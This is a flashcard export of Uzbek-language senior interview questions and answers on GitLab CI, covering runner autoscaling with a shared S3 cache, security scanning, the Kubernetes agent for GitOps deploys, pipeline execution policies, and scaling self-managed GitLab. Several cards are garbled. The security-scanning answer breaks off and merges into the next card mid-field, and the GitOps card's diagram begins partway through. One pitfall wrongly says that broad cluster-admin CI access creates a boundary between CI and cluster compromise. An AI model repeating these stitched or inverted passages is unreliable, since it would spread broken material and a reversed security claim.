Interview Drill::CI/CD::I9 GitLab CI	idrill-33047	<p>Runner autoscaling va distributed cache qanday quriladi?</p>	<p><b>Qisqa javob:</b> Autoscaling — runner manager navbatga qarab job'lar uchun resursni dinamik yaratadi: kubernetes executor (har job pod, cluster autoscaler/Karpenter node qo'shadi) yoki docker-autoscaler/instance executor (fleeting plaginlari bilan cloud VM'lar; eski docker+machine deprecated). Distributed cache — runner'lar umumiy object storage'da (S3/GCS/Azure) cache saqlaydi, shunda qaysi runner job olsa ham cache topadi.</p><p><b>Arxitektura:</b></p><pre>GitLab navbat<br>   ^ poll<br>runner manager (concurrent=200)<br>   | job<br>   v<br>kubernetes executor -&gt; pod (cpu/memory request/limit)<br>   node yetmasa -&gt; Karpenter yangi node (spot)<br>cache:  pod &lt;--&gt; S3 bucket &quot;ci-cache&quot; (umumiy)</pre><p><b>Amalda (<code>config.toml</code>):</b></p><pre>concurrent = 200            # manager bo'yicha jami parallel job<br>check_interval = 3<br><br>[[runners]]<br>  name = &quot;k8s-build&quot;<br>  executor = &quot;kubernetes&quot;<br>  limit = 150               # shu runner uchun<br>  [runners.cache]<br>    Type = &quot;s3&quot;<br>    Shared = true           # boshqa runner'lar bilan bo'lishadi<br>    [runners.cache.s3]<br>      ServerAddress = &quot;s3.amazonaws.com&quot;<br>      BucketName = &quot;ci-cache&quot;<br>      BucketLocation = &quot;eu-central-1&quot;<br>      # credential - IRSA/Pod Identity orqali, kalitsiz<br>  [runners.kubernetes]<br>    namespace = &quot;ci-jobs&quot;<br>    cpu_request = &quot;1&quot;<br>    cpu_limit = &quot;4&quot;<br>    memory_request = &quot;2Gi&quot;<br>    memory_limit = &quot;4Gi&quot;<br>    poll_timeout = 600<br>    [runners.kubernetes.node_selector]<br>      &quot;workload&quot; = &quot;ci&quot;</pre><p>Job darajasida resursni oshirish (ruxsat berilgan bo'lsa): <code>KUBERNETES_MEMORY_LIMIT: 8Gi</code>.</p><p><b>Monitoring:</b></p><pre>gitlab_runner_jobs{state=&quot;running&quot;}<br>gitlab_runner_concurrent<br>histogram_quantile(0.95, rate(gitlab_runner_job_queue_duration_seconds_bucket[10m]))</pre><p>Asosiy SLI — job queue duration (job qancha kutdi).</p><p><b>Tuzoqlar:</b></p><ul><li>Request/limit yo'q — bitta og'ir job node'ni egallaydi, boshqalari OOM/CPU throttling.</li><li>Spot node'lar o'ldiriladi — <code>retry: when: [runner_system_failure]</code>, uzoq job'lar on-demand pool'da.</li><li>S3 cache'da lifecycle yo'q — bucket cheksiz o'sadi; 14-30 kunlik expiration.</li><li><code>concurrent</code> kichik — runner'lar bo'sh, job'lar navbatda.</li></ul><p><b>Senior nuqta:</b> Scale-to-zero arzon, lekin cold start (node + image pull) daqiqalar oladi — ish vaqtida minimal &quot;issiq&quot; sig'im va prebuilt, kichik CI image'lar bilan muvozanat qil.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33048	<p>GitLab security scanning (SAST, DAST, dependency, secret detection) pipeline'ga qanday qo'shiladi?</p>	<p><b>Qisqa javob:</b> GitLab tayyor shablonlarni <code>include: template:</code> bilan ulaydi: SAST (kod statik tahlili), Secret Detection (kodda kalitlar), Dependency Scanning (zaif kutubxonalar), Container Scanning (image CVE'lari), DAST (ishlayotgan ilovaga hujum simulyatsiyasi). Natijalar MR'da va Security Dashboard'da ko'rinadi. Interview Drill::CI/CD::I9 GitLab CI	idrill-33050	<p>GitLab bilan GitOps/K8s deploy (agent) qanday tashkil qilinadi?</p>	<p><b>Qisqa javob:</b> GitLab agent for Kubernetes (<code>agentk</code>) cluster ichida o'rnatiladi va GitLab'ga <b>chiquvchi</b> ulanish ochadi — cluster API'ni internetga ochish va kubeconfig'ni CI variable'da saqlash kerak bo'lmaydi. Git/OCI'dan tortadi -&gt; apply<br>  agentk -&gt; GitLab'ga holat va bildirishnomalar</pre><p><b>Amalda:</b> Agent konfiguratsiyasi (<code>.gitlab/agents/prod-agent/config.yaml</code>):</p><pre>ci_access:<br>  projects:<br>    - id: acme/app<br>      access_as:<br>        ci_job: {}                 # impersonation: job identity bilan RBAC<br>      environments: [&quot;production&quot;]</pre><p>Pipeline:</p><pre>deploy-prod:<br>  image: alpine/k8s:1.30.4<br>  environment: production<br>  script:<br>    - kubectl config use-context acme/platform:prod-agent<br>    - helm upgrade --install app ./chart --set image.digest=$IMAGE_DIGEST<br>  rules:<br>    - if: $CI_COMMIT_TAG</pre><p>Agent o'rnatish: <code>helm install agentk gitlab/gitlab-agent --set config.token=$AGENT_TOKEN --set config.kasAddress=wss://kas.gitlab.example.com</code>.</p><p><b>Push va pull:</b></p><p>| | Push (CI) | Pull (Flux) | |---|---|---| | Soddalik | yuqori | o'rtacha | | CI'da cluster huquqi | bor | yo'q | | Drift tuzatish | yo'q | avtomatik | | Audit | pipeline log | git log | | Rollback | qayta deploy / environment rollback | <code>git revert</code> |</p><p><b>Tuzoqlar:</b></p><ul><li><code>ci_access</code> ni butun guruhga va cluster-admin huquq bilan berish — har loyiha pipeline'i cluster'ni boshqaradi; Bu CI kompromatsiyasi bilan cluster kompromatsiyasi orasida chegara yaratadi.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33051	<p>Compliance pipeline / pipeline execution policy nima va qachon kerak?</p>	<p><b>Qisqa javob:</b> Pipeline execution policy (eski nomi compliance pipeline, u deprecated) — GitLab Ultimate'da markaziy jamoa (security/compliance) yozgan CI job'larini ko'p loyihaning pipeline'iga majburan qo'shish mexanizmi. Policy ham kod: review, test, versiya, changelog.</p>	lvl::Senior dom::cicd sec::i9 GitLab_CI
Interview Drill::CI/CD::I9 GitLab CI	idrill-33052	<p>Self-managed GitLab va runner'larni qanday masshtablash va ishonchli qilish kerak?</p>	<p><b>Qisqa javob:</b> Self-managed GitLab'ni masshtablash: yuk bo'yicha Reference Architecture tanlash (foydalanuvchi/RPS soniga qarab — bitta node'dan Gitaly Cluster, alohida PostgreSQL/Redis, Sidekiq node'larigacha yoki Cloud Native Hybrid), barcha fayllar (artifact, LFS, registry, uploads) object storage'da, runner'lar autoscaling va workload bo'yicha ajratilgan.
